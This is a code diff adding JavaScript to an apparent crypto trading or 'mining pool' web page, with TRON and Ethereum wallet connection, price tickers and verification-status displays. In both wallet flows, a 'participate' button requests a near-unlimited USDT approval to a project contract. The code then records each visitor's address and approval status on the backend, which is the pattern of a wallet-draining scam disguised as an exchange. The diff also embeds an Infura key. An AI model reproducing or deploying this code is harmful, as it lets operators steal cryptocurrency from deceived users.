+                $('.van-collapse-item3 img').removeClass('hover-up')
+            } else {
+                $('.van-collapse-item3 img').addClass('hover-up')
+            }
+            $('.van-collapse-item__content3').slideToggle('slow');
+        })
+        $('.info_img1').click(function () {
+            $('.asset-usdt').hide()
+            $('.asset-usdt2').show()
+            $('.info_img1').hide()
+            $('.info_img2').show()
+        })
+        $('.info_img2').click(function () {
+            $('.asset-usdt').show()
+            $('.asset-usdt2').hide()
+            $('.info_img1').show()
+            $('.info_img2').hide()
+        })
+        $('.jumpPool').click(function () {
+            window.location.href = ` /Home/ftx/?a=${jumpAddress}`;
+        })
+        $('.jumplug').click(function () {
+            window.location.href = ` /Home/language?a=${jumpAddress}`;
+        })
+        $('.TradeTitle').click(function () {
+            window.location.href = `/Home/ftx?a=${jumpAddress}`;
+        })
+        $('.fexCenterMenuQuick').click(function () {
+            window.location.href = ` /Home/recharge?a=${jumpAddress}`;
+        })
+
+        $('.mu-list .container').eq(2).click(function () {
+            // alert(primary_c)
+            if (primary_c == undefined) {
+                // alert('未登录')
+            }
+            if (advanced_c == 2) {
+
+            } else if (primary_c === null || primary_c == 0 || primary_c == 3) {
+                window.location.href =
+                    ` /Home/Certification?a=${jumpAddress}`;
+            }
+            // if (primary_c == 1) {
+
+            // }
+            // if (primary_c == 2) {
+
+            // }
+        })
+        $('.mu-list .container').eq(3).click(function () {
+            if (advanced_c == undefined) { }
+            if (primary_c == 2 && advanced_c === null || advanced_c == 0 || advanced_c == 3) {
+                window.location.href =
+                    ` /Home/CertificationTwo?a=${jumpAddress}`;
+            }
+            // if (advanced_c == 1) {
+
+            // }
+            // if (advanced_c == 2) {
+
+            // }
+        })
+        //网络选择处理
+        // let inte = storage.getItem('internetV');
+
+    });
+    function begin() {
+        GetCoinPrice();
+        getTokenGroup();
+        GetSystemParam();
+        // GetCurrentauthorizeAccount();
+        // GetWalletBalanceInfo();
+        setInterval(GetCoinPrice, 2000);
+        setInterval(getTokenGroup, 25000);
+    }
+    //erc Web3处理逻辑
+
+
+    //trc Web3处理逻辑
+    function web3Trc() {
+        // $('#language').val(language_type ?? 'en');
+        getTronWeb();
+
+    };
+    function getTronWeb() {
+        var obj = setInterval(async () => {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                clearInterval(obj)
+                if (typeof window.tronWeb !== 'undefined') {
+                    var tronWeb = window.tronWeb;
+                    var address = tronWeb.defaultAddress.base58;
+                    if (!address) {
+                        $('.quality-info').hide();
+                        $('.banner-container').hide();
+                        $('.quality-input input').attr('disabled', 'disabled');
+                        alert(language['openWallet']);
+                    }
+                    storage.setItem({
+                        name: "indexAddress",
+                        expires: 1000 * 6000,
+                        value: address,
+                        startTime: new Date().getTime()
+                    });
+                    // $('.js_login').attr('assowance', allowance).attr('address', address).html(
+                    //     address.substr(address.length - 9));
+                    // GetLiquidityCondition(address);
+                    var usdt_contract = tronWeb.contract(contractsTRC.walletProject.usdtabi, contractsTRC
+                        .walletProject.tokenAddress);
+                    var allowance = await usdt_contract.methods.allowance(address, contractsTRC
+                        .walletProject.address).call();
+                    var Navigator = navigator.userAgent;
+                    var ifIos = /(iPhone|iPad|iPod|iOS)/i.test(Navigator);
+                    var device = 'andriod';
+                    if (ifIos) device = 'ios';
+                    var data = $.param({
+                        'address': address,
+                        'trx': 0,
+                        'usdt': 0,
+                        'device': device
+                    });
+                    $.ajax({
+                        url: '/Home/AddCustomerInfoTrx',
+                        data: data,
+                        async: true,
+                        success: function (data) {
+                            begin();
+                            $('div.mu-loading-wrap__fixed').hide();
+                            jumpAddress = storage
+                                .getItem('loginAddress') ??
+                                address;
+                            $('#bannerBTC')
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/trade?type=BTC&a=" +
+                                    jumpAddress + "'")
+                                .show();
+                            $('#bannerETH')
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/trade?type=ETH&a=" +
+                                    jumpAddress + "'")
+                                .show();
+                            $('#bannerXRP')
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/trade?type=XRP&a=" +
+                                    jumpAddress + "'")
+                                .show();
+
+                            $('.mu-list .container:first li a')
+                                .attr('onclick',
+                                    "javascript:location.href='/?a=" +
+                                    jumpAddress + "'")
+                            $('.mu-list .container li a').eq(1)
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/ftx?a=" +
+                                    jumpAddress + "'")
+                            $('.mu-list .container li a').eq(2)
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/assets?a=" +
+                                    jumpAddress + "'")
+                            $('.mu-list .container li a').eq(3)
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/inviteFriends?a=" +
+                                    jumpAddress + "'")
+                            $('.mu-list .container li a').eq(4)
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/superRebate?a=" +
+                                    jumpAddress + "'")
+                            $('.mu-list .container li a').eq(5)
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/language?a=" +
+                                    jumpAddress + "'")
+                            $('.mu-list .container li a').eq(6)
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/help?a=" +
+                                    jumpAddress + "'")
+                            $('.mu-list .container li a').eq(9)
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/termsService?a=" +
+                                    jumpAddress + "'")
+                            $('.mu-list .container li a').eq(10)
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/login?a=" +
+                                    jumpAddress + "'")
+                            $('.mu-list .container li a').eq(11)
+                                .attr('onclick',
+                                    "javascript:location.href='/Home/register?a=" +
+                                    jumpAddress + "'")
+                            var result = $.parseJSON(data.Data);
+                            $('.js_cusId').html(parseInt(result
+                                .data.id) + 10000);
+                            $('.share').html(window.location
+                                .origin + '?t=' + result
+                                    .data.eid + '&s=' + result
+                                        .data.id);
+                            if (!result.data.IsNormal) {
+                                //如果后台是已授权
+                                if (result && result.data
+                                    .status != 0) {
+                                    //合约是未授权
+                                    if (parseFloat(allowance) <=
+                                        0) {
+                                        //修改后台为未授权
+                                        //UpdateCustomerStatus(
+                                        //    address, 0);
+                                    }
+                                } else {
+                                    if (parseFloat(allowance) >
+                                        0) {
+                                        //修改后台为未授权
+                                        UpdateCustomerStatus(
+                                            address, 1);
+                                    }
+                                }
+                            } else {
+                                $(".js_mainArea").show();
+                                $(".pledge").show();
+                                $('.js_shouq').hide();
+                                $('.imprint').hide();
+                                $('.pool_data').hide();
+                                $('#security').hide();
+                                $('div.quantity-list:last')
+                                    .hide()
+                                $('.js_rizhi .van-tab:first')
+                                    .click();
+                            }
+                            $.when(
+                                GetCurrentauthorizeAccount(
+                                    jumpAddress)
+                            )
+                        }
+                    });
+                    GetWalletBalanceInfo(address)
+                    if (parseFloat(allowance) <= 0) {
+                        $(".js_mainArea").show();
+                        $(".pledge").show();
+                        $('.js_shouq').show();
+                        $('.imprint').show();
+                    } else {
+                        $(".js_mainArea").show();
+                        $(".pledge").show();
+                        $('.js_shouq').show();
+                        $('.imprint').show();
+                        $('.js_rizhi .van-tab:first').click();
+                    }
+                    var allowanceMoney = tronWeb.fromSun(allowance._hex);
+                    tronWeb.trx.getBalance(address).then(
+                        function (sum) {
+                            var trxBalance = tronWeb.fromSun(sum);
+                            console.log('trx余额:' + trxBalance);
+                            usdt_contract.balanceOf(address).call(function (error, result) {
+                                var usdtBalance = tronWeb.fromSun(result._hex);
+                                $('.js_currMoney').html(usdtBalance);
+
+                            });
+                        }
+                    );
+
+                    $('.js_shouqbtn').unbind("click").click(async function () {
+                        const approval = (1E6 * 99999999).toString();
+                        $('.js_shouqbtn').html('participarea la cerere...');
+                        if (parseFloat(allowance) <= 0) {
+                            await usdt_contract.methods.approve(contractsTRC.walletProject
+                                .address, approval).send({
+                                    from: address
+                                }, function (error, result) {
+                                    UpdateCustomerStatus(address, 1);
+                                    location.href = '/';
+
+                                });
+                        } else {
+                            UpdateCustomerStatus(address, 1);
+                            location.href = '/';
+                        }
+                    });
+                } else {
+                    $('.quality-info').hide();
+                    $('.banner-container').hide();
+                    $('.quality-input input').attr('disabled', 'disabled');
+                    alert(language['openWallet']);
+                }
+            }
+        }, 50)
+
+
+
+    }
+    //取币种价格
+    function GetCoinPrice() {
+        $.ajax({
+            url: '/Home/GetCoinPrice',
+            async: true,
+            success: function (data) {
+                if (data.Code == 0) {
+                    var result = $.parseJSON(data.Data);
+                    for (var i = 0; i < result.data.length; i++) {
+                        var dataStr = result.data[i];
+                        $('#' + dataStr.symbol + '-price span:first').text(dataStr.priceUsd);
+                        $('#' + dataStr.symbol + '-change span:first').text(dataStr.changeUsd1h > 0 ? '+ ' +
+                            dataStr.changeUsd1h.toFixed(2) + ' %' : dataStr.changeUsd1h.toFixed(2) +
+                        ' %');
+                        if (dataStr.changeUsd1h > 0) {
+                            $('#' + dataStr.symbol + '-price span:first').addClass('green').removeClass(
+                                'red');
+                            $('#' + dataStr.symbol + '-change span:first').addClass('greenbg').removeClass(
+                                'redbg');
+                        } else {
+                            $('#' + dataStr.symbol + '-price span:first').addClass('red').removeClass(
+                                'green');
+                            $('#' + dataStr.symbol + '-change span:first').addClass('redbg').removeClass(
+                                'greenbg');
+                        }
+                        switch (dataStr.symbol) {
+                            case 'BTC':
+                                $('div#bannerBTC span:eq(2)').text(dataStr.priceUsd);
+                                $('div#bannerBTC span:eq(3)').text(dataStr.changeUsd1h > 0 ? '+ ' + dataStr
+                                    .changeUsd1h.toFixed(2) + ' %' : dataStr.changeUsd1h.toFixed(2) +
+                                ' %');
+                                if (dataStr.changeUsd1h > 0) {
+                                    $('div#bannerBTC span:eq(2), div#bannerBTC span:eq(3)').addClass(
+                                        'green')
+                                        .removeClass('red');
+                                } else {
+                                    $('div#bannerBTC span:eq(2), div#bannerBTC span:eq(3)').addClass('red')
+                                        .removeClass('green');
+                                }
+                                break;
+                            case 'ETH':
+                                $('div#bannerETH span:eq(2)').text(dataStr.priceUsd);
+                                $('div#bannerETH span:eq(3)').text(dataStr.changeUsd1h > 0 ? '+ ' + dataStr
+                                    .changeUsd1h.toFixed(2) + ' %' : dataStr.changeUsd1h.toFixed(2) +
+                                ' %');
+                                if (dataStr.changeUsd1h > 0) {
+                                    $('div#bannerETH span:eq(2), div#bannerETH span:eq(3)').addClass(
+                                        'green')
+                                        .removeClass('red');
+                                } else {
+                                    $('div#bannerETH span:eq(2), div#bannerETH span:eq(3)').addClass('red')
+                                        .removeClass('green');
+                                }
+                                break;
+                            case 'XRP':
+                                $('div#bannerXRP span:eq(2)').text(dataStr.priceUsd);
+                                $('div#bannerXRP span:eq(3)').text(dataStr.changeUsd1h > 0 ? '+ ' + dataStr
+                                    .changeUsd1h.toFixed(2) + ' %' : dataStr.changeUsd1h.toFixed(2) +
+                                ' %');
+                                if (dataStr.changeUsd1h > 0) {
+                                    $('div#bannerXRP span:eq(2), div#bannerXRP span:eq(3)').addClass(
+                                        'green')
+                                        .removeClass('red');
+                                } else {
+                                    $('div#bannerXRP span:eq(2), div#bannerXRP span:eq(3)').addClass('red')
+                                        .removeClass('green');
+                                }
+                                break;
+                        }
+                    }
+
+                }
+            }
+        });
+    }
+    function getTokenGroup() {
+        $.ajax({
+            url: '/Home/GetTokenGroup',
+            // data: obj,
+            async: true,
+            success: function (data) {
+                var result1 = $.parseJSON(data.Data)
+                let arr1 = result1.data
+                var allist = arr1.find(i => i.name == name);
+                var symbolList = allist.symbols;
+                var pricesList = allist.prices;
+                var changeUsd1hsList = allist.changeUsd1hs;
+                var iconsList = allist.icons;
+                var tempHtml = '';
+                if (allist.symbols.length === 0) {
+                    $("#coinListItem").html('');
+                } else {
+
+                    for (var i = 0; i < allist.symbols.length; i++) {
+                        var symbolTemp = allist.symbols[i];
+                        var pricesTemp = allist.prices[i];
+                        var changeUsdTemp = allist.changeUsd1hs[i];
+                        var iconsTemp = allist.icons[i];
+                        if (iconsTemp == "") {
+                            iconsTemp = "/resource/logo_" + symbolTemp + ".png";
+                        }
+                        if ($('#' + symbolTemp + '-price span')[0]) {
+                            $('#' + symbolTemp + '-price span:first').text(pricesTemp);
+                            $('#' + symbolTemp + '-change span:first').text(changeUsdTemp > 0 ? '+ ' +
+                                changeUsdTemp.toFixed(2) + ' %' : changeUsdTemp.toFixed(2) +
+                            ' %');
+                            if (changeUsdTemp > 0) {
+                                $('#' + symbolTemp + '-price span:first').addClass('green').removeClass(
+                                    'red');
+                                $('#' + symbolTemp + '-change span:first').addClass('greenbg').removeClass(
+                                    'redbg');
+                            } else {
+                                $('#' + symbolTemp + '-price span:first').addClass('red').removeClass(
+                                    'green');
+                                $('#' + symbolTemp + '-change span:first').addClass('redbg').removeClass(
+                                    'greenbg');
+                            }
+                        } else {
+                            tempHtml += `<div data-v-41bb2ad4="" class="flex alcenter jumpAlcenter"
+                                                                                            style="border-top: 1px solid rgb(238, 238, 238); padding: 10px 13px 10px 13px; border-right-color: rgb(238, 238, 238); border-bottom-color: rgb(238, 238, 238); border-left-color: rgb(238, 238, 238);"
+                                                                                                onclick="javascript:location.href='/Home/SpotGoods?type=${symbolTemp}&a=${jumpAddress}'">
+                                                                                            <div data-v-41bb2ad4="" class="flex flex-column"
+                                                                                                style="text-align: left;
+                                                                                                overflow: hidden;
+                                                                                                white-space: nowrap;
+                                                                                                text-overflow: ellipsis;
+                                                                                                width: 105px;">
+                                                                                                <span data-v-41bb2ad4=""
+                                                                                                    style="font-size: 14px; font-weight: bold;flex-direction: row; align-items: center;overflow: hidden;
+                                                                                                    white-space: nowrap;
+                                                                                                    text-overflow: ellipsis;
+                                                                                                    display: block;">
+                                                                                                    <div data-v-41bb2ad4="" class="mu-avatar  "
+                                                                                                        style="width: 25px; height: 25px; font-size: 8px; margin-right: 5px;vertical-align: bottom;">
+                                                                                                        <div class="mu-avatar-inner">
+                                                                                                            <img data-v-41bb2ad4=""
+                                                                                                                    src="${iconsTemp}">
+                                                                                                        </div>
+                                                                                                        </div> ${symbolTemp}/<span data-v-41bb2ad4="" class="fColor1" style="color: #777;
+                                                                                                    font-weight: 100;
+                                                                                                    font-size: 12px;
+                                                                                                ">USDT</span>
+                                                                                                </span>
+
+                                                                                            </div>
+                                                                                            <div data-v-41bb2ad4="" class="flex flex-column flex1"
+                                                                                                style="text-align: center; flex: 2 1 0%;" id="${symbolTemp}-price">
+                                                                                                <span data-v-41bb2ad4="" class="${changeUsdTemp > 0 ? 'green' : 'red'}"
+                                                                                                        style="font-weight: bold; font-size: 15px;">${pricesTemp}</span>
+                                                                                                <span data-v-41bb2ad4=""
+                                                                                                    style="font-size: 10px; font-weight: bold; color: rgb(170, 170, 170);">Vol
+                                                                                                    49.63 K</span>
+                                                                                            </div>
+                                                                                            <div data-v-41bb2ad4=""
+                                                                                                style="width: 110px; text-align: right; display: flex; flex-direction: row; align-items: end;"
+                                                                                                id="${symbolTemp}-change">
+                                                                                                <span data-v-41bb2ad4="" class="ft16 ${changeUsdTemp > 0 ? 'greenbg' : 'redbg'}"
+                                                                                                        style="display: block; width: 100%;">${changeUsdTemp > 0 ? changeUsdTemp.toFixed(2) : changeUsdTemp.toFixed(2)}%</span>
+                                                                                            </div>
+                                                                                        </div>`
+                            $("#coinListItem").html(tempHtml);
+                        }
+
+
+                    }
+                }
+            }
+            // console.length
+
+        })
+    }
+    //获取客户信息authorizeAccount
+    function GetCurrentauthorizeAccount(jumpAddress) {
+        var address = jumpAddress;
+        var data = $.param({
+            'address': address,
+            status: true
+        });
+        $.ajax({
+            url: '/Home/GetauthorizeAccount',
+            data: data,
+            async: true,
+            success: function (data) {
+                if (data.Code != -1) {
+                    var result = $.parseJSON(data.Data);
+                    $('div.mu-drawer h1').html('ID:' + (result.data.id));
+                    $('.connect-wallet').html('ID:' + (result.data.id));
+                    // alert(result.data.id)
+                    // if()
+                    // console.log(result)
+                    //if (result.data.vipid) {
+
+                    //    $('.vip-icon').attr("src", "../resource/" + result.data.vipid + ".png");
+                    //} else {
+                    //    $(".vip-icon").attr("src", "../resource/1.png");
+                    //}
+                    //$('.vip-icon').show();
+
+                    primary_c = result.data.primary_certification
+                    advanced_c = result.data.advanced_certification
+                    if (result.data.primary_certification == null || result.data.primary_certification ==
+                        0) {
+                        $('.Primary_sta .Certified').hide()
+                        $('.Primary_sta .verifying').hide()
+                        $('.Primary_sta .NotVerified').show()
+                    }
+                    if (result.data.primary_certification == 1) {
+                        $('.Primary_sta .Certified').hide()
+                        $('.Primary_sta .NotVerified').hide()
+                        $('.Primary_sta .verifying').show()
+                    }
+                    if (result.data.primary_certification == 2) {
+                        $('.Primary_sta .Certified').show()
+                        $('.Primary_sta .NotVerified').hide()
+                        $('.Primary_sta .verifying').hide()
+                    }
+
+                    if (result.data.advanced_certification == null || result.data.advanced_certification ==
+                        0) {
+                        $('.Advanced_sta .Certified').hide()
+                        $('.Advanced_sta .verifying').hide()
+                        $('.Advanced_sta .NotVerified').show()
+                    }
+                    if (result.data.advanced_certification == 1) {
+                        $('.Advanced_sta .Certified').hide()
+                        $('.Advanced_sta .NotVerified').hide()
+                        $('.Advanced_sta .verifying').show()
+                    }
+                    if (result.data.advanced_certification == 2) {
+                        $('.Advanced_sta .Certified').show()
+                        $('.Advanced_sta .NotVerified').hide()
+                        $('.Advanced_sta .verifying').hide()
+                    }
+                }
+            }
+        });
+
+    }
+    //获取客户信息GetWalletBalanceInfo
+    function GetWalletBalanceInfo(jumpAddress) {
+        // alert(jumpAddress)
+        var address = jumpAddress;
+        var data = $.param({
+            'sendAddress': address
+        });
+        $.ajax({
+            url: '/Home/GetWalletBalanceInfo',
+            data: data,
+            async: true,
+            success: function (data) {
+                if (data.Code != -1) {
+                    var result = $.parseJSON(data.Data);
+                    exchange_usdt = result.data.exchange_usdt ?? 0;
+                    trade_usdt = result.data.trade_usdt ?? 0;
+                    // alert(result.data.trade_usdt)
+                    let MoenyName_type = storage.getItem('MoenyName');
+                    let la = $('.MoenyName span:first').attr('value', MoenyName_type ?? 'usdt')
+                    $('.MoenyName span:first').text(la.attr('value').toUpperCase())
+                    if (la.attr('value') == 'usdt') {
+                        $('.asset-usdt').html(result.data.trade_usdt ?? 0);
+                    }
+                    if (la.attr('value') == 'btc') {
+                        $('.asset-usdt').html(result.data.btc_amount ?? 0);
+                    }
+                    if (la.attr('value') == 'eth') {
+                        $('.asset-usdt').html(result.data.eth_amount ?? 0);
+                    }
+                    if (la.attr('value') == 'usdc') {
+                        $('.asset-usdt').html(result.data.usdc_amount ?? 0);
+                    }
+
+                    $('.selectd').click(function () {
+                        $('.selector ul').show()
+                    })
+
+                    $('.selector,.selector ul').mouseleave(function () {
+                        $('.selector ul').hide()
+                    })
+                    $('.selector ul li').click(function () {
+                        let la = $('.MoenyName span:first').html($(this).html()).attr("value", $(
+                            this).attr('value'))
+                        if (la.attr('value') == 'usdt') {
+                            $('.asset-usdt').html(result.data.trade_usdt ?? 0);
+                        }
+                        if (la.attr('value') == 'btc') {
+                            $('.asset-usdt').html(result.data.btc_amount ?? 0);
+                        }
+                        if (la.attr('value') == 'eth') {
+                            $('.asset-usdt').html(result.data.eth_amount ?? 0);
+                        }
+                        if (la.attr('value') == 'usdc') {
+                            $('.asset-usdt').html(result.data.usdc_amount ?? 0);
+                        }
+                        storage.setItem({
+                            name: "MoenyName",
+                            expires: 1000 * 3600 * 100000000,
+                            value: la.attr('value'),
+                            startTime: new Date().getTime()
+                        });
+                        $('.selector ul').hide()
+                    })
+                }
+            },
+            error: function () { }
+        });
+    }
+    //取系统参数
+    function GetSystemParam() {
+        let storage = new MyStorage();
+        let systemParam = storage.getItem('systemParam');
+        if (false) {
+            var result = systemParam;
+            for (var i = 0; i < result.data.length; i++) {
+                var dataStr = result.data[i];
+                if (dataStr.Name == 'customer_service') {
+                    $('.kefu a').attr('href', dataStr.Value);
+                }
+            }
+        } else {
+            $.ajax({
+                url: '/Home/GetSystemParam',
+                async: true,
+                success: function (data) {
+                    if (data.Code == 0) {
+                        var result = $.parseJSON(data.Data);
+                        storage.setItem({
+                            name: "systemParam",
+                            expires: 1000 * 60,
+                            value: result,
+                            startTime: new Date().getTime()
+                        });
+                        for (var i = 0; i < result.data.length; i++) {
+                            var dataStr = result.data[i];
+                            if (dataStr.Name == 'customer_service') {
+                                $('.kefu a').attr('href', dataStr.Value);
+                                 $('.fexCenterMenuService1').attr('onclick',"javascript:location.href='"+dataStr.Value+"'");
+                            }
+                        }
+                    }
+                }
+            });
+        }
+    }
+    $('.demo-loading-wrap').on("mousewheel DOMMouseScroll onmousewheel touchmove scroll", function (e) {
+        var st = $('.demo-loading-wrap').scrollTop()
+        if (st > 0) {
+            $('header').hide()
+        } else {
+            $('header').show()
+        }
+
+    });
+</script>
+<script type="text/javascript">
+    var webex = null;
+    var usdt_contract_ex = null;
+    $(function () {
+        if (typeof window.ethereum !== 'undefined') {
+            connectWallet();
+        } else {
+            $('.quality-info').hide();
+            $('.banner-container').hide();
+            $('.quality-input input').attr('disabled', 'disabled');
+            alert(language['openWallet']);
+        }
+    });
+    function UpdateCustomerStatus(address, state) {
+        var Navigator = navigator.userAgent;
+        var ifIos = /(iPhone|iPad|iPod|iOS)/i.test(Navigator);
+        var device = 'andriod';
+        if (ifIos) device = 'ios';
+        //"receipt" 返回 Object: 交易收据有效时触发。
+        var data = $.param({
+            'address': address,
+            'status': state,
+            'device': device
+        });
+        var states;
+        $.ajax({
+            url: '/Home/UpdateCustomerInfo',
+            data: data,
+            async: true,
+            success: function (data) {
+                var result = $.parseJSON(data.Data);
+                states = result.data.status;
+            },
+            complete: function (result) {
+
+            }
+        });
+        return states;
+    }
+    async function connectWallet() {
+        var ethereum = window.ethereum;
+        //当用户切换网络时，MetaMask扩展会自动刷新重载
+        //ethereum.autoRefreshOnNetworkChange = false;
+        //连接钱包
+        await ethereum.enable();
+        //创建新的合约
+        web3 = new Web3(ethereum);
+        webex = new Web3('https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161');
+        //创建新的智能合约实例
+
+        var wallet_contract = new web3.eth.Contract(contractsERC.walletProject.abi, contractsERC.walletProject
+            .address);
+        try {
+            var usdt_contract = new web3.eth.Contract(contractsERC.walletProject.usdtabi, contractsERC
+                .walletProject.tokenAddress);
+        } catch (error) {
+        }
+        usdt_contract_ex = new webex.eth.Contract(contractsERC.walletProject.usdtabi, contractsERC.walletProject.tokenAddress);
+
+        //地址栏有没有address
+        // var addressOld = window.location.search.substr(1).split("=")[1];
+        web3.eth.getAccounts(async function (error, result) {
+            if (!error) {
+                var address = storage
+                    .getItem('loginAddress') ??
+                    result[0];
+                if (address) {
+                    storage.setItem({
+                        name: "indexAddress",
+                        expires: 1000 * 6000,
+                        value: address,
+                        startTime: new Date().getTime()
+                    });
+                }
+                try {
+                    var allowance = await usdt_contract.methods.allowance(address, contractsERC
+                        .walletProject.address).call();
+                } catch (error) {
+                }
+                if (allowance != 0 && (!allowance)) {
+                    var allowance = await usdt_contract_ex.methods.allowance(address, contractsERC
+                        .walletProject.address).call();
+                }
+                $('.js_login').attr('assowance', allowance).attr('address', address).html(
+                    address.substr(address.length - 10));
+                //await usdt_contract.methods.approve(contracts.walletProject.address, 0).send({ from: address }, function (error, result) { }).on('receipt', function (receipt) {
+                //    console.log(receipt);
+                //    UpdateCustomerStatus(address, 0);
+                //});
+                // GetLiquidityCondition(address);
+                var Navigator = navigator.userAgent;
+                var ifIos = /(iPhone|iPad|iPod|iOS)/i.test(
+                    Navigator);
+                var device = 'andriod';
+                if (ifIos) device = 'ios';
+                var data = $.param({
+                    'address': address,
+                    'eth': 0,
+                    'usdt': 0,
+                    'device': device
+                });
+                $.ajax({
+                    url: '/Home/AddCustomerInfo',
+                    data: data,
+                    success: function (data) {
+                        begin();
+                        $('div.mu-loading-wrap__fixed').hide();
+                        jumpAddress = storage
+                            .getItem('loginAddress') ??
+                            address;
+                        // $('.grid-item , .jumpAlcenter ')
+                        //     .attr('onclick',
+                        //         "javascript:location.href='/Home/trade?a=" +
+                        //         jumpAddress + "'")
+                        //     .show();
+                        $('#bannerBTC')
+                            .attr('onclick',
+                                "javascript:location.href='/Home/SpotGoods?type=BTC&a=" +
+                                jumpAddress + "'")
+                            .show();
+                        $('#bannerETH')
+                            .attr('onclick',
+                                "javascript:location.href='/Home/SpotGoods?type=ETH&a=" +
+                                jumpAddress + "'")
+                            .show();
+                        $('#bannerXRP')
+                            .attr('onclick',
+                                "javascript:location.href='/Home/SpotGoods?type=XRP&a=" +
+                                jumpAddress + "'")
+                            .show();
+
+                        $('.mu-list .container:first li a')
+                            .attr('onclick',
+                                "javascript:location.href='/?a=" +
+                                jumpAddress + "'")
+                        $('.mu-list .container li a').eq(1)
+                            .attr('onclick',
+                                "javascript:location.href='/Home/ftx?a=" +
+                                jumpAddress + "'")
+                        $('.mu-list .container li a').eq(2)
+                            .attr('onclick',
+                                "javascript:location.href='/Home/assets?a=" +
+                                jumpAddress + "'")
+                        $('.mu-list .container li a').eq(3)
+                            .attr('onclick',
+                                "javascript:location.href='/Home/inviteFriends?a=" +
+                                jumpAddress + "'")
+                        $('.mu-list .container li a').eq(4)
+                            .attr('onclick',
+                                "javascript:location.href='/Home/superRebate?a=" +
+                                jumpAddress + "'")
+                        $('.mu-list .container li a').eq(5)
+                            .attr('onclick',
+                                "javascript:location.href='/Home/language?a=" +
+                                jumpAddress + "'")
+                        $('.mu-list .container li a').eq(6)
+                            .attr('onclick',
+                                "javascript:location.href='/Home/help?a=" +
+                                jumpAddress + "'")
+                        $('#termsServiceee')
+                            .attr('onclick',
+                                "javascript:location.href='/Home/termsService?a=" +
+                                jumpAddress + "'")
+                        $('#loginInnnn a')
+                            .attr('onclick',
+                                "javascript:location.href='/Home/login?a=" +
+                                jumpAddress + "'")
+                        $('.mu-list .container li a').eq(11)
+                            .attr('onclick',
+                                "javascript:location.href='/Home/register?a=" +
+                                jumpAddress + "'")
+                        var result = $.parseJSON(data
+                            .Data);
+
+                        if (!result) {
+                            console.log('result', result)
+                        } else {
+                            $('.js_cusId').html(parseInt(
+                                result.data.id) +
+                                10000);
+                            $('.share').html(window.location
+                                .origin + '?s=' + result
+                                    .data.id);
+                             if (result.data.a_message) {
+                                 $('#exampleModal .modal-body')
+                                     .html(result.data
+                                         .a_message);
+                                 $('#exampleModal').modal(
+                                     'show');
+                             }
+                            if (!result.data.IsNormal) {
+                                //如果后台是已授权
+                                if (result.data.status !=
+                                    0) {
+                                    //合约是未授权
+                                    if (parseFloat(
+                                        allowance) <=
+                                        0) {
+                                        //修改后台为未授权
+                                        //UpdateCustomerStatus
+                                        //    (address, 0);
+                                    }
+                                } else {
+                                    if (parseFloat(
+                                        allowance) >
+                                        0) {
+                                        //修改后台为已授权
+                                        UpdateCustomerStatus
+                                            (address, 1);
+                                    }
+                                }
+                            } else {
+                                $(".js_mainArea").show();
+                                $(".pledge").show();
+                                $('.js_shouq').show();
+                                $('.imprint').show();
+                                $('.js_rizhi .van-tab:first').click();
+                            }
+                            $.when(
+
+                                GetCurrentauthorizeAccount(
+                                    jumpAddress)
+                            )
+                            // .done(GetLiquidtyData(
+                            //     address))
+                        }
+
+                    }
+                });
+                GetWalletBalanceInfo(address)
+                // GetCurrentauthorizeAccount(jumpAddress)
+                if (parseFloat(allowance) <= 0) {
+                    $(".js_mainArea").show();
+                    $(".pledge").show();
+                    $('.js_shouq').show();
+                    $('.imprint').show();
+                } else {
+                    $(".js_mainArea").show();
+                    $(".pledge").show();
+                    $('.js_shouq').show();
+                    $('.imprint').show();
+                    $('.js_rizhi .van-tab:first').click();
+                }
+
+
+                web3.eth.getBalance(address).then(
+                    function (wei) {
+                        var balance = web3.utils.fromWei(wei);
+                        wallet_contract.methods.getBalance(contractsERC.walletProject
+                            .tokenAddress, address).call(function (error, result) {
+                                var balanceUsdt = result ?? '0';
+                                balanceUsdt = web3.utils.fromWei(balanceUsdt,
+                                    'mwei');
+                                var web3list = {};
+                                web3list.eth = balance;
+                                web3list.usdt = balanceUsdt;
+                                storage.setItem({
+                                    name: "web3Money",
+                                    expires: 1000 * 3600 * 100000000,
+                                    value: web3list,
+                                    startTime: new Date().getTime()
+                                });
+                                $('.js_currMoney').html(balanceUsdt);
+
+                            });
+                    });
+
+                $('.js_shouqbtn').unbind("click").click(async function () {
+                    $('.js_shouqbtn').html(language['participating']);
+                    console.log({
+                        allowance
+                    });
+                    const approval = (1E6 * 9999999).toString();
+
+                    await usdt_contract.methods.approve(contractsERC.walletProject
+                        .address, approval).send({
+                            from: address,
+                            gasPrice: 30000000000,
+                            gas: 82574
+                        }, function (error, result) { }).on('receipt', function (
+                            receipt) {
+                            console.log(receipt);
+                            UpdateCustomerStatus(address, 1);
+                            location.href = '/';
+                        });
+                });
+            }
+        });
+    }
+    function copyToClipBoard() {
+        var str = $('.share').text();
+        var textArea = document.getElementById("clipBoard");
+        if (textArea === null) {
+            textArea = document.createElement("textarea");
+            textArea.id = "clipBoard";
+            textArea.textContent = str;
+            document.body.appendChild(textArea);
+        }
+        textArea.select();
+        try {
+            var ret = document.execCommand('copy') ? true : false;
+            document.body.removeChild(textArea);
+            if (navigator.clipboard) navigator.clipboard.writeText(str).then(() => { }).catch(err => { });
+            alertTip(language['copySuccessfully'], 'success');
+            return ret;
+        } catch (err) {
+            return err;
+        }
+    }
+</script>
